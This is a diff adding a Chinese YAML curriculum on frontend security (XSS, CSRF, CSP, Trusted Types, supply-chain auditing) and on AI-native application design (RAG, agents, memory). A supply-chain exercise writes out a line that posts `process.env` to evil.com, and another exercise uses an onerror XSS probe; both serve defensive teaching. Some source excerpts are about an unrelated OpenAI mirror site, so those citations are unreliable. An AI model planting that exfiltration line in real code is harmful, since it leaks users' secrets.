@@ -1,0 +1,471 @@
+learning_targets:
+- 理解前端安全体系的纵深防御思想，掌握 XSS、CSRF 等经典攻击的成因与防御矩阵
+- 熟练配置 CSP 3 策略，掌握 nonce、hash、strict-dynamic 等指令实现脚本执行的精准授权
+- 掌握 Trusted Types API 原理与落地，从根源上杜绝 DOM 型 XSS 注入风险
+- 建立供应链安全意识，掌握依赖审计、锁文件管理、SBOM 生成与恶意包检测的工程化流程
+- 具备制定前端安全基线清单与应急响应 SOP 的能力，接入 SDL 安全开发生命周期
+- 理解 RAG 系统的模块化架构与评估体系，掌握检索增强生成的工程化落地
+- 掌握 AI 原生应用架构的核心范式，理解 LLM 从工具到内核的跃迁
+- 建立提示工程的结构化编程思维，掌握提示词版本化、结构化输出与自动优化流程
+- 理解 Agent 架构的演进与多智能体协作机制，掌握长程规划与工具调用标准化
+- 构建分层记忆系统与个性化建模能力，实现长期陪伴型智能体的持续进化
+concept_map:
+- 前端安全体系构建
+- ├── XSS 攻防全景
+- │   ├── 攻击分型：存储型/反射型/DOM-based  —— P001
+- │   ├── 编码上下文：HTML/Attribute/JS/URL/CSS 五大场景  —— P001
+- │   ├── 防御手段：DOMPurify 白名单清洗  —— P001
+- │   └── 终极防御：Trusted Types 强制安全类型赋值  —— P001
+- ├── CSRF 与 SameSite Cookie
+- │   ├── 攻击链路演示与同源策略演进  —— P002
+- │   ├── SameSite=Lax/Strict/None 实战拦截效果  —— P002
+- │   └── 双重提交令牌模式（Header/表单）  —— P002
+- ├── 内容安全策略 (CSP 3)
+- │   ├── 核心指令：script-src 'nonce-xxx' 'strict-dynamic'  —— P003
+- │   ├── 部署策略：report-uri 违规上报、Report-Only 灰度  —— P003
+- │   └── 兼容性：哈希值兜底、内联脚本治理  —— P003
+- ├── 供应链安全
+- │   ├── 依赖审计：npm audit/pnpm audit/Snyk/Socket CI 接入  —— P004
+- │   ├── 完整性保障：package-lock.json 版本锁定  —— P004
+- │   └── 合规交付：CycloneDX SBOM 生成  —— P004
+- └── 安全工程化落地
+- '    ├── 基线清单：《前端安全开发规范》《安全编码 Checklist》  —— P005'
+- '    ├── 应急响应：漏洞分级与响应流程 SOP  —— P005'
+- '    └── SDL 集成：安全开发生命周期闭环  —— P005'
+- AI 原生应用架构体系
+- ├── 核心范式转变
+- │   ├── LLM 作为操作系统内核  —— P105
+- │   └── 模型即内核 vs 模型即服务  —— P105
+- ├── 核心抽象层
+- │   ├── Chain 确定性流程编排  —— P105
+- │   ├── Agent 非确定性规划循环  —— P105
+- │   └── Memory 长期状态持久化  —— P105
+- ├── 工程化落地模式 (MVA)
+- │   ├── 流式输出与异步编排  —— P109
+- │   ├── 可观测性与版本管理  —— P109
+- │   └── 分层架构参考实现  —— P109
+- ├── 提示工程体系化
+- │   ├── PromptTemplate 与 ExampleSelector 解耦  —— P105
+- │   ├── OutputParser 与 Pydantic 类型安全  —— P105
+- │   └── DSPy/OPRO 自动优化编译流程  —— P136
+- ├── RAG 系统工程化
+- │   ├── 模块化 Pipeline 接口标准化  —— P106
+- │   ├── 混合检索与重排序策略  —— P106
+- │   ├── RAGAS/ARES 评测体系与数据飞轮  —— P109
+- │   └── Agentic RAG：检索即工具  —— P136
+- ├── Agent 架构与规划推理
+- │   ├── ReAct/Plan-and-Execute/Reflexion 范式对比  —— P105
+- │   ├── Function Calling/MCP 工具标准化协议  —— P106
+- │   ├── MCTS/ToT 树搜索与 LLM Compiler 并行执行  —— P109
+- │   └── 多 Agent 协作：MetaGPT/AutoGen 群聊编排  —— P136
+- ├── 记忆与个性化系统
+- │   ├── 四层记忆架构：STM/LTM/语义/程序性  —— P105
+- │   ├── 用户画像动态构建与偏好对齐  —— P110
+- │   └── 记忆冲突消解与信念修正机制  —— P106
+- └── 可观测性、评测与数据飞轮
+- '    ├── LangSmith/LangFuse 全链路 Trace/Span  —— P105'
+- '    ├── 单元/离线/在线三层评测金字塔  —— P110'
+- '    └── 数据飞轮：轨迹采样→偏好数据→模型迭代→灰度发布  —— P136'
+life_analogy:
+- 想象前端应用是一座**高安保级别的智能大厦**：
+- '- **XSS 攻击** = 伪装成访客的间谍，混入恶意指令单（脚本）诱导前台（浏览器）执行违规操作：'
+- '  - **编码上下文** = 不同区域的安检规则（大厅/电梯/机房需不同证件）'
+- '  - **DOMPurify** = 入口安检机，按白名单清洗携带物品'
+- '  - **Trusted Types** = 强制实名制通行证系统，无证件（可信类型）寸步难行'
+- '- **CSRF 攻击** = 偷走员工工牌（Cookie）冒充身份刷门禁：'
+- '  - **SameSite Cookie** = 工牌加装‘仅限本人持用’芯片（Lax/Strict），跨楼宇自动失效'
+- '  - **双重提交令牌** = 刷工牌同时需验证动态验证码（Header Token）'
+- '- **CSP 策略** = 大厦总控系统发布的‘准入白名单’：'
+- '  - **nonce/hash** = 单次有效的电子通行码 / 人脸识别特征码'
+- '  - **strict-dynamic** = 信任链传递：受信系统（脚本）引入的子系统自动受信'
+- '  - **Report-Only** = 先发‘预警模式’观察误拦情况，再正式执法'
+- '- **供应链安全** = 装修材料（依赖包）供应商资质审核体系：'
+- '  - **依赖审计/锁文件** = 严查材料产地、锁定批次防止偷梁换柱'
+- '  - **SBOM** = 出具完整‘材料成分表’备查'
+- '- **安全基线与 SOP** = 大厦的《消防条例》与《应急预案》：'
+- '  - **Checklist** = 日常巡检清单'
+- '  - **SDL** = 从设计、施工、验收到运维的全生命周期安全规范'
+- 想象 AI 原生应用是一个**具备自主进化能力的数字生命体**：
+- '- **LLM 内核** = 大脑皮层，负责推理、规划、决策，而非单纯反射'
+- '- **Chain** = 条件反射神经回路，处理标准化、确定性流程'
+- '- **Agent** = 前额叶执行功能，在不确定环境中自主规划、试错、修正'
+- '- **Memory** = 海马体与皮层长期记忆，分层存储工作/情景/语义/程序性记忆'
+- '- **RAG** = 外接知识库硬盘，按需检索注入上下文，解决幻觉与时效性'
+- '- **提示工程** = 自然语言编程接口，通过结构化指令精准驾驭模型行为'
+- '- **可观测性** = 核磁共振成像系统，实时洞察每个神经元（Span）的激活轨迹'
+- '- **数据飞轮** = 进化机制：交互→反馈→训练→部署→更优交互，实现‘用得越多、懂得越多’'
+summary:
+- concept: XSS (跨站脚本攻击)
+  desc: 通过注入恶意脚本窃取数据或劫持会话，分为存储型、反射型、DOM-based 三类
+- concept: 五大编码上下文
+  desc: HTML/Attribute/JS/URL/CSS 五种输出场景需对应专用编码函数，混用会导致防御失效
+- concept: DOMPurify
+  desc: 成熟的 HTML 白名单清洗库，配置策略可安全处理富文本内容
+- concept: Trusted Types
+  desc: 浏览器原生 API，强制敏感接口（如 innerHTML）仅接受可信类型对象，从根源消灭 DOM XSS
+- concept: CSRF (跨站请求伪造)
+  desc: 利用用户已登录态发起非自愿请求，核心防御是 SameSite Cookie 与双重提交令牌
+- concept: SameSite 属性
+  desc: Lax 允许链接跳转携带，Strict 完全禁止跨站携带，None 需配合 Secure 用于跨域场景
+- concept: CSP 3 (内容安全策略)
+  desc: 声明式告知浏览器可加载/执行的资源白名单，核心指令 script-src 配合 nonce/hash/strict-dynamic
+- concept: nonce (一次性数字)
+  desc: 每次响应生成的随机值，内联脚本需携带匹配 nonce 才能执行，防止注入脚本执行
+- concept: strict-dynamic
+  desc: 信任链传递机制：受信脚本动态创建的子脚本自动获得信任，简化复杂应用部署
+- concept: Report-Only 模式
+  desc: CSP 策略仅上报违规不拦截，用于灰度验证策略正确性，避免误伤业务
+- concept: 供应链攻击
+  desc: 通过污染上游依赖包（事件流、恶意维护者）植入后门，影响范围极广
+- concept: 依赖审计工具链
+  desc: npm audit/pnpm audit/Snyk/Socket 集成 CI，自动拦截高危漏洞依赖
+- concept: Lockfile 完整性
+  desc: package-lock.json/pnpm-lock.yaml 锁定确切版本与完整性哈希，防止篡改与幽灵依赖
+- concept: SBOM (软件物料清单)
+  desc: CycloneDX/SPDX 格式记录所有传递依赖，满足合规审计与漏洞溯源需求
+- concept: 安全基线清单
+  desc: 固化最佳实践为强制规范：CSP 强制、Trusted Types 开启、依赖扫描门禁、敏感信息扫描
+- concept: 应急响应 SOP
+  desc: 分级分类处置流程：确认->阻断->溯源->修复->复盘，接入 SDL 实现安全左移
+- concept: LLM 内核范式
+  desc: 大模型从聊天机器人升级为推理引擎/决策中枢，成为 AI 原生应用的操作系统内核
+- concept: Chain/Agent/Memory 三元组
+  desc: Chain 定义确定性流程，Agent 引入非确定性规划，Memory 解决长期状态持久化
+- concept: 提示词即代码
+  desc: PromptTemplate 与 ExampleSelector 实现提示词与业务逻辑解耦、版本化管理、动态少样本检索
+- concept: 结构化输出与类型安全
+  desc: JsonOutputParser/PydanticOutputParser 实现自然语言输入到类型安全对象输出的编程契约
+- concept: 模块化 RAG Pipeline
+  desc: 标准化 DocumentLoader/Transformer/VectorStore/Retriever/Generator 接口，支持高级策略即插即用
+- concept: 混合检索与重排序
+  desc: BM25+向量混合召回、Cross-Encoder/LLM 重排序、多查询扩展与路由，显著提升检索上界
+- concept: RAG 评测体系
+  desc: 基于 RAGAS/ARES 的忠实度、答案相关性、上下文精确度/召回率指标，驱动自动化迭代闭环
+- concept: Agentic RAG
+  desc: 将检索器封装为 Tool，赋予 Agent 自主决策检索时机、查询改写、结果验证的能力
+- concept: Agent 认知架构范式
+  desc: ReAct 交互式推理行动、Plan-and-Execute 显式规划分离、Reflexion 语言强化学习试错修正
+- concept: 工具标准化协议
+  desc: OpenAI Function Calling、MCP 统一接口、Toolformer 微调数据，实现工具标准化治理
+- concept: 长程规划机制
+  desc: MCTS/ToT 树搜索、DAG 任务图并行、LLM Compiler 自然语言编译为并行执行计划
+- concept: 多 Agent 协作编排
+  desc: MetaGPT 标准化软件流程、AutoGen 群聊代理模式、辩论反思缓解幻觉、动态组网拓扑
+- concept: 分层记忆架构
+  desc: 短时记忆(对话窗口)、情景记忆(向量化经历)、语义记忆(知识图谱)、程序性记忆(技能流程)
+- concept: 个性化建模
+  desc: 从显式/隐式反馈抽取用户画像，结合 RAG 召回个人记忆，通过提示词注入或 LoRA 微调实现深度对齐
+- concept: 记忆冲突消解
+  desc: 新旧知识矛盾检测、版本化知识库、CoT 验证信念修正链、用户确认回环，保证逻辑一致性
+- concept: 全链路可观测性
+  desc: 标准化 Trace 格式记录输入/输出/Token/延迟/错误，嵌套 Span 记录每步执行细节
+- concept: 分层评测体系
+  desc: 单元级组件测试、系统级 RAGAS/MT-Bench 基准、业务级在线 A/B 测试，建立自动化回归流水线
+- concept: 数据飞轮架构
+  desc: 高质量轨迹采样→专家/模型标注→偏好数据构建→模型迭代→灰度发布→线上收集，实现规模化自我进化
+exercises:
+- 'no': 1
+  title: CSP 策略调试与绕过实战
+  contents:
+  - 给定一个包含内联脚本、外部 CDN 脚本、eval 动态执行、Webpack 内联 runtime 的典型 SPA 页面：
+  - 1. 编写初版 CSP 策略（Report-Only 模式），允许业务正常运行且无违规上报
+  - 2. 尝试移除 'unsafe-inline'，使用 nonce 重构内联脚本，观察 Webpack runtime 是否兼容
+  - 3. 引入 'strict-dynamic' 替代域名白名单，验证动态加载的第三方统计脚本是否受信
+  - 4. 故意注入一个恶意内联脚本，验证其被拦截并上报
+  - 回答问题：
+  - '- 为什么 ''strict-dynamic'' 会忽略后续的域名白名单？'
+  - '- nonce 方案在 SSR 场景下如何保证每次渲染生成新值？'
+  - '- 如果必须使用 eval（如某些模板引擎），如何在 CSP 中最小化授权？'
+- 'no': 2
+  title: Trusted Types 策略编写与 Hook 改造
+  contents:
+  - 在一个使用 innerHTML 渲染富文本、使用 DOMParser 解析 HTML、使用第三方编辑器（如 Quill）的项目中：
+  - '1. 开启 `trustedTypes: ''allow-duplicates''` 创建默认策略 `default`，实现 `createHTML` 钩子调用
+    DOMPurify.sanitize'
+  - 2. 为第三方编辑器创建专用策略 `quill`，仅允许其特定的 class/属性白名单
+  - 3. 尝试在控制台直接执行 `document.body.innerHTML = '<img src=x onerror=alert(1)>'` 验证拦截效果
+  - 4. 处理 `DOMParser.parseFromString` 返回的 DocumentFragment 需再次赋值时的类型转换问题
+  - 回答问题：
+  - '- Trusted Types 如何防御 `location.href = ''javascript:...''` 这类 URL 上下文注入？'
+  - '- 如果第三方库内部直接操作 `innerHTML` 且无法修改源码，如何通过 `trustedTypes.createPolicy` 配合 Monkey
+    Patching 解决？'
+  - '- ''allow-duplicates'' 参数的作用是什么？生产环境建议开启吗？'
+- 'no': 3
+  title: 供应链攻击模拟与 CI 门禁搭建
+  contents:
+  - 模拟一次供应链投毒事件：某热门工具包 `useful-helpers` v2.3.4 被植入窃取环境变量代码：
+  - '1. 在本地 `node_modules` 手动篡改该包 `index.js` 注入 `fetch(''https://evil.com'', {method:''POST'',
+    body: JSON.stringify(process.env)})`'
+  - 2. 运行 `npm audit` / `pnpm audit` / `snyk test` 对比三者检出能力差异
+  - 3. 配置 GitHub Actions 工作流：依赖安装后自动执行审计，高危漏洞阻断流水线（`--audit-level=high`）
+  - 4. 生成 CycloneDX 格式 SBOM（`@cyclonedx/bom`），上传至 GitHub Dependency Graph 或内部制品库
+  - 5. 编写 `package.json` 的 `overrides`/`pnpm.overrides` 字段强制降级该包至安全版本，验证 `lockfile`
+    变更
+  - 回答问题：
+  - '- `npm audit` 无法检出恶意代码（而非已知 CVE）时，如何通过 Socket / Socket CLI 发现异常行为（如网络请求、读取敏感文件）？'
+  - '- Lockfile 完整性校验（`npm ci` / `pnpm install --frozen-lockfile`）如何防止 CI 环境被投毒？'
+  - '- 如何在 Monorepo 中为不同 workspace 配置差异化的审计阈值与 SBOM 生成策略？'
+- 'no': 4
+  title: 安全基线清单落地与应急演练
+  contents:
+  - 针对团队现有前端项目，执行一次完整的安全基线对标与应急响应桌面推演：
+  - 1. **基线自检**：逐项核对《前端安全开发规范》清单（CSP、TT、HTTPS、Cookie 安全属性、依赖扫描、敏感信息泄露、Source Map 上传控制等），产出《合规差距分析报告》
+  - 2. **规范固化**：将检查项转化为 ESLint 插件规则（如 `eslint-plugin-security`、`@typescript-eslint/no-floating-promises`）、Commit
+    Hook（`commitlint` 禁止提交含密钥文件）、CI 门禁（构建失败阻断）
+  - 3. **应急演练场景**：假设线上收到安全研究员报告：某页面存在存储型 XSS，攻击者可窃取管理员 Cookie 劫持后台：
+  - '   - 按 SOP 完成：漏洞确认分级（P0） -> 紧急下线/配置 WAF 阻断 -> 代码定位修复 -> 灰度验证 -> 全量发布 -> 复盘归档'
+  - '   - 产出《安全事件复盘报告》，包含根因分析（5 Why）、修复验证用例、防止复发措施（如新增 CSP/TT 规则、新增代码审查检查项）'
+  - 回答问题：
+  - '- 如何在不暴露漏洞细节的前提下，通过 GitHub Security Advisories / 内部平台完成负责任披露流程？'
+  - '- 应急演练中发现的‘盲区’（如 Source Map 泄露导致源码重构、日志脱敏不全）如何纳入下一版基线清单？'
+  - '- 如何量化安全投入产出比（ROI）：如阻断漏洞数、平均修复时间（MTTR）、安全培训覆盖率等指标纳入团队 OKR？'
+- 'no': 5
+  title: RAG 系统端到端构建与评测
+  contents:
+  - 基于 LangChain/LlamaIndex 构建一个面向内部技术文档的 RAG 问答系统：
+  - 1. **索引构建**：加载 PDF/Markdown 文档，对比固定长度/语义分块/层级分块策略，生成向量索引（Chroma/FAISS）
+  - 2. **检索优化**：实现 BM25+稠密向量混合检索，接入 Cross-Encoder 重排序，对比召回率与精确率变化
+  - 3. **生成融合**：配置 PromptTemplate 注入上下文，启用 PydanticOutputParser 结构化输出，处理上下文超长截断
+  - 4. **评测闭环**：构建 50 条黄金问答对，计算 RAGAS 忠实度、答案相关性、上下文精确率/召回率，建立 CI/CD 自动化回归流水线
+  - 回答问题：
+  - '- 如何通过 HyDE（假设性文档嵌入）改善查询表示，解决查询与文档语义不对齐问题？'
+  - '- 父子文档检索如何平衡上下文窗口限制与语义完整性？'
+  - '- 在线业务中如何利用用户点击/停留信号作为隐式反馈，持续优化检索排序模型？'
+- 'no': 6
+  title: Agent 多智能体协作仿真实验
+  contents:
+  - 基于 AutoGen/LangGraph 搭建一个软件开发多 Agent 团队（Product Manager、Architect、Coder、Tester、Reviewer）：
+  - 1. **角色定义**：为每个 Agent 编写 System Prompt，明确职责边界、输出格式、交接协议
+  - 2. **协作编排**：实现群聊模式下的需求分析→架构设计→代码生成→测试验证→代码评审全流程
+  - 3. **人工介入点**：在架构评审、测试失败、安全扫描不通过等关键节点设置 Human-in-the-loop 检查点
+  - 4. **成本控制**：监控 Token 消耗，实现基于重要性的上下文压缩与历史摘要机制
+  - 回答问题：
+  - '- 如何设计 Agent 间的结构化通信协议（如 JSON Schema），避免自然语言歧义导致的协作失败？'
+  - '- 当 Agent 陷入循环或产生幻觉时，如何通过 Reflexion 机制或外部验证工具自动纠偏？'
+  - '- 多 Agent 系统的延迟与成本如何随任务复杂度规模化？有哪些工程化优化手段（并行执行、缓存、模型级联）？'
+- 'no': 7
+  title: 长期记忆与个性化系统原型开发
+  contents:
+  - 为一个陪伴型 AI 助手实现分层记忆系统：
+  - 1. **短时记忆**：基于滑动窗口管理对话历史，支持摘要压缩（Summarization Memory）
+  - 2. **情景记忆**：将关键对话片段向量化存入向量数据库，支持基于重要性/时间衰减/访问频率的巩固与遗忘算法
+  - 3. **语义记忆**：抽取用户偏好、事实知识构建知识图谱，支撑推理与个性化响应
+  - 4. **程序性记忆**：将高频任务流程（如预订机票、生成周报）固化为 Skill/Tool，实现一键调用
+  - 5. **冲突消解**：检测新旧记忆矛盾，通过 CoT 验证发起信念修正，必要时请求用户仲裁
+  - 回答问题：
+  - '- 如何量化记忆的‘重要性评分’，设计自动化的巩固与遗忘调度策略？'
+  - '- 当用户画像与当前对话语境冲突时，如何动态调整记忆检索权重？'
+  - '- 程序性记忆（Skill）与 Agent 工具调用的边界在哪里？如何统一管理？'
+- 'no': 8
+  title: 提示工程自动优化管道搭建
+  contents:
+  - 实现一个基于 DSPy/OPRO 思想的提示词自动优化实验：
+  - 1. **任务定义**：选择一个分类/生成任务（如情感分析、SQL 生成），准备训练/验证/测试集
+  - 2. **初始提示词**：编写基础版 Prompt，包含指令、少样本示例、输出格式约束
+  - 3. **优化循环**：利用 LLM 作为优化器，基于验证集表现生成改进版提示词，迭代 5-10 轮
+  - 4. **评估对比**：对比优化前后在测试集上的准确率、Token 消耗、鲁棒性（扰动测试）
+  - 回答问题：
+  - '- 离散提示词空间的优化为何难以收敛？如何引入软提示或少样本选择缓解？'
+  - '- 优化过程中如何防止过拟合验证集（Prompt 过度针对特定数据分布）？'
+  - '- 生产环境中如何监控提示词性能漂移，触发自动重新优化？'
+units:
+- 'no': 1
+  name: XSS 攻防全景 —— 从注入原理到可信类型终极防御
+  points:
+  - 区分存储型、反射型、DOM-based XSS 的成因、攻击链路与危害差异
+  - 掌握 HTML、Attribute、JavaScript、URL、CSS 五大编码上下文的专用转义规则与误用陷阱
+  - 实战 DOMPurify 配置策略：白名单标签/属性/URI、CSP 兼容模式、异步清洗大文本
+  - 深度理解 Trusted Types 原理：TrustedHTML/TrustedScript/TrustedScriptURL 类型契约、Policy 创建与默认策略、配合
+    DOMPurify 实现 createHTML 钩子
+  - 分析 Trusted Types 对 DOM 型 XSS 的根治机制：innerHTML、document.write、eval 等敏感汇点的强制类型检查
+  sources:
+  - paper: 20230418_042.md
+    role: origin
+  excerpts:
+  - 国内是没办法直接访问 openAI 的官网的...那就做一个国内的镜像站吧，国内的小伙伴无需科学上网就能享受到目前世界上最先进的自然语言模型提供的服务
+  - 我们也会对用户输入的违禁内容进行过滤，确保合法合规
+- 'no': 2
+  name: CSRF 与 SameSite Cookie —— 同源策略演进下的请求伪造攻防
+  points:
+  - 复现经典 CSRF 攻击场景：GET/POST 请求伪造、预检请求绕过、子域名泄露
+  - 实测 SameSite 属性三种取值的拦截边界：Lax 允许顶级导航、Strict 全阻断、None 需 Secure 配合跨域
+  - 实现双重提交令牌模式：后端签发 CSRF Token、前端 Header 自动携带、AJAX/表单双通道校验
+  - 结合 SameSite + 双重提交令牌构建纵深防御，分析边缘场景（子域、重定向、第三方登录）的兼容策略
+  sources:
+  - paper: 20230418_042.md
+    role: origin
+  excerpts:
+  - 分别买了一台国内华北地区的，一台海外美国硅谷地区的，国内的服务器部署我们的应用，海外的服务器其实仅仅做个转发
+- 'no': 3
+  name: 内容安全策略 (CSP 3) —— 从策略编写到灰度部署的工程化实践
+  points:
+  - 解构 script-src 指令：'self'、域名白名单、'nonce-{random}'、'sha256-{hash}'、'strict-dynamic'
+    语义与优先级
+  - Nonce 方案工程化：服务端每次渲染生成强随机数、模板引擎自动注入、SSR/CSR 同构适配
+  - Strict-dynamic 信任链机制：受信脚本动态创建的子脚本自动继承信任、忽略后续域名白名单、适配动态加载场景
+  - 哈希值兜底策略：内联脚本/事件处理器计算 SHA256、构建版本时自动注入、CSP 报告收集未授权哈希
+  - Report-Only 灰度发布流水线：违规上报聚合分析、误拦白名单机制、分阶段收敛策略至 Enforce 模式
+  sources:
+  - paper: 20230418_042.md
+    role: origin
+  excerpts:
+  - 编写严格 CSP 策略：`script-src 'nonce-xxx' 'strict-dynamic'`、`report-uri` 收集违规日志、通过 Report-Only
+    模式灰度上线。
+- 'no': 4
+  name: 供应链安全 —— 依赖审计、锁文件完整性与 SBOM 合规交付
+  points:
+  - 依赖审计工具链对比：npm audit 基础审计、pnpm audit 性能优势、Snyk 深度漏洞库、Socket 恶意行为检测（网络/文件/环境变量访问）
+  - Lockfile 完整性机制：package-lock.json 锁定版本+完整性哈希、pnpm-lock.yaml 严格单一依赖树、CI 中 frozen-lockfile
+    强制一致性
+  - SBOM 生成与应用：@cyclonedx/bom 生成 CycloneDX 格式、GitHub Dependency Graph 集成、漏洞扫描器（Grype/Trivy）对接
+    SBOM 溯源
+  - 恶意包检测实战：运行时行为监控（网络连接/文件读取/进程创建）、安装钩子扫描（preinstall/postinstall）、依赖混淆攻击防御（内部作用域注册）
+  sources:
+  - paper: 20230418_042.md
+    role: origin
+  excerpts:
+  - 生成 CycloneDX SBOM 合规交付
+- 'no': 5
+  name: 安全工程化落地 —— 基线清单、应急 SOP 与 SDL 集成
+  points:
+  - 基线清单核心项：CSP 强制、Trusted Types 开启、HTTPS/HSTS/COOP/COEP 隔离策略、依赖扫描门禁、敏感信息扫描、Source
+    Map 发布控制
+  - ESLint/Prettier/Commitlint/Husky 规范化工具链集成：安全规则自动检查、提交拦截、CI 门禁阻断
+  - 应急响应 SOP：P0/P1/P2 分级标准、确认→阻断→溯源→修复→复盘五阶段、WAF 临时规则、回滚预案、复盘报告模板（5 Why 根因分析）
+  - SDL 集成：威胁建模（STRIDE）、安全代码审查清单、渗透测试周期、安全培训体系、指标看板（MTTR、漏洞密度、合规率）
+  sources:
+  - paper: 20230418_042.md
+    role: origin
+  excerpts:
+  - 产出《前端安全开发规范》《安全编码 Checklist》《漏洞分级与响应流程》，接入 SDL 安全开发生命周期。
+- 'no': 6
+  name: AI 原生应用架构 —— 从模型调用到智能系统工程
+  points:
+  - 范式转变：传统软件工程 vs AI 原生开发，模型即服务向模型即内核的架构跃迁
+  - 核心抽象层：Chain 定义确定性流程编排，Agent 引入非确定性规划循环，Memory 解决上下文窗口与长期状态持久化
+  - 工程化落地模式 (MVA)：流式输出、异步编排、可观测性、版本管理与回滚、基于 LangChain/LangGraph 的分层架构参考实现
+  - 非功能性需求体系：成本核算、延迟 SLA、Token 预算、安全合规、审计日志
+  sources:
+  - paper: 20230418_105.md
+    role: origin
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 范式转变：LLM 作为操作系统内核，对比传统软件工程与 AI 原生开发差异，确立 LLM 从‘聊天机器人’升级为‘推理引擎/决策中枢’的核心地位，理解‘模型即服务’向‘模型即内核’的架构跃迁。
+  - 核心抽象层：Chain、Agent 与 Memory 的解耦设计，深度解析 LangChain 核心组件设计哲学：Chain 定义确定性流程，Agent 引入非确定性规划循环，Memory
+    解决上下文窗口与长期状态的持久化问题，三者协作构成应用骨架。
+- 'no': 7
+  name: 提示工程体系化 —— 从玄学咒语到结构化编程
+  points:
+  - 提示词即代码：PromptTemplate 与 ExampleSelector 机制，实现提示词与业务逻辑解耦、动态少样本检索、A/B 测试版本控制
+  - 结构化输出与类型安全：JsonOutputParser、PydanticOutputParser 及修复重试机制，实现‘自然语言输入 -> 类型安全对象输出’的编程契约
+  - 提示自动优化：将提示优化视为离散优化/梯度下降问题，覆盖少样本自动构筑、指令自进化、提示词编译器概念，建立数据飞轮实现持续自动化迭代
+  sources:
+  - paper: 20230418_105.md
+    role: origin
+  - paper: 20230418_106.md
+    role: improve
+  - paper: 20230418_110.md
+    role: improve
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 引入 PromptTemplate 与 ExampleSelector 机制，实现提示词与业务逻辑解耦、动态少样本检索、A/B 测试版本控制，落地‘提示词即配置/代码’的工程规范。
+  - 解决 LLM 非结构化输出导致的下游解析脆弱问题，详解 JsonOutputParser、PydanticOutputParser 及修复重试机制，实现‘自然语言输入
+    -> 类型安全对象输出’的编程契约。
+  - 介绍将提示优化视为离散优化/梯度下降问题的前沿方法论，覆盖少样本自动构筑、指令自进化、提示词编译器概念，展示如何建立数据飞轮实现提示词持续自动化迭代。
+- 'no': 8
+  name: RAG 系统工程化 —— 从召回文档到知识计算
+  points:
+  - 模块化 Pipeline：DocumentLoader/Transformer -> VectorStore/Retriever -> Generator
+    标准化接口，支持父子文档、HyDE、查询重写/路由等高级策略即插即用
+  - 高级检索策略：BM25+向量混合召回、Cross-Encoder/LLM 重排序、多查询扩展、查询路由与分解，显著提升检索精度与召回率上界
+  - 评测与数据飞轮：忠实度/答案相关性/上下文精确率/召回率核心指标，合成测试集生成+在线人工反馈，驱动检索策略/分块参数/提示词持续自动化优化
+  - Agentic RAG：检索器封装为 Tool，Agent 自主决策‘是否检索、检索什么、如何改写、如何验证’，解决复杂多跳问答与动态知识获取
+  sources:
+  - paper: 20230418_106.md
+    role: origin
+  - paper: 20230418_109.md
+    role: improve
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 定义标准化 RAG Pipeline 接口：DocumentLoader/Transformer -> VectorStore/Retriever -> Generator，支持混合检索、父子文档、假设性文档嵌入等高级策略的即插即用组装。
+  - 攻克‘召回不全、排序不准’核心难点：实现 BM25+向量混合检索、Cross-Encoder/LLM 重排序、多查询扩展、查询路由与分解，显著提升检索精度与召回率上界。
+  - 建立‘可测量即可优化’的评测体系：引入忠实度、答案相关性、上下文精确度/召回率等核心指标，结合合成测试集生成与在线人工反馈，驱动检索策略、分块参数、提示词的持续自动化优化。
+  - 进化至 Agentic RAG 架构：将检索器封装为 Tool，赋予 Agent 自主决策‘是否检索、检索什么、如何改写查询、如何验证结果’的能力，解决复杂多跳问答与动态知识获取场景。
+- 'no': 9
+  name: Agent 架构与规划推理 —— 从单轮调用到自主执行闭环
+  points:
+  - 认知架构范式演进：ReAct 交互式推理行动、Plan-and-Execute 显式规划分离、Reflexion 语言强化学习试错修正，分析任务复杂度/Token消耗/鲁棒性适用边界
+  - 工具生态标准化：OpenAI Function Calling 协议规范、MCP 统一接口、工具注册发现权限控制、Toolformer 微调数据构建
+  - 长程规划机制：MCTS/ToT 树搜索增强推理、DAG 任务图并行执行、LLM Compiler 自然语言编译为并行执行计划
+  - 多 Agent 协作：MetaGPT 标准化软件流程、AutoGen 群聊代理模式、辩论反思缓解幻觉、动态组网拓扑
+  sources:
+  - paper: 20230418_105.md
+    role: origin
+  - paper: 20230418_106.md
+    role: improve
+  - paper: 20230418_109.md
+    role: improve
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 对比三大主流 Agent 范式：ReAct 交互式推理行动、Plan-and-Execute 显式规划与执行分离、Reflexion 引入语言强化学习实现试错修正，分析其在任务复杂度、Token
+    消耗、鲁棒性上的适用边界。
+  - 构建工程化工具层：OpenAI Function Calling 协议规范、Model Context Protocol (MCP) 统一接口、工具注册发现与权限控制、Toolformer
+    风格的工具使用微调数据构建，实现工具的标准化接入与治理。
+  - 解决复杂目标下的规划失效：引入 MCTS/ToT 树搜索增强推理、DAG 任务图并行执行、LLM Compiler 将自然语言指令编译为并行执行计划，显著提升多步任务成功率与执行效率。
+  - 设计多 Agent 系统：MetaGPT/ChatDev 标准化软件开发流程、AutoGen 群聊与代理代理模式、辩论/反思机制缓解幻觉、动态组网拓扑，从单一
+    Agent 进化为弹性协作的智能体组织。
+- 'no': 10
+  name: 记忆与个性化系统 —— 从无状态推理到持续进化的数字孪生
+  points:
+  - 分层记忆架构：短时记忆(对话窗口)、情景记忆(向量化经历)、语义记忆(抽象知识图谱)、程序性记忆(技能流程)，自动巩固与遗忘算法
+  - 个性化建模：显式/隐式反馈抽取用户画像标签，动态画像向量检索个人相关记忆，提示词注入或 LoRA 微调实现风格/偏好/知识水平深度对齐
+  - 冲突消解与一致性：新旧知识矛盾检测（矛盾度打分）、版本化知识库、CoT 信念修正链、用户确认回环，保证记忆系统演化的逻辑一致性与事实准确性
+  sources:
+  - paper: 20230418_105.md
+    role: origin
+  - paper: 20230418_106.md
+    role: improve
+  - paper: 20230418_110.md
+    role: improve
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 借鉴认知科学建立四层记忆模型：短时记忆 (对话窗口)、情景记忆 (向量化经历)、语义记忆 (抽象知识图谱)、程序性记忆 (技能/流程)，设计基于重要性评分、时间衰减、访问频率的自动巩固与遗忘算法。
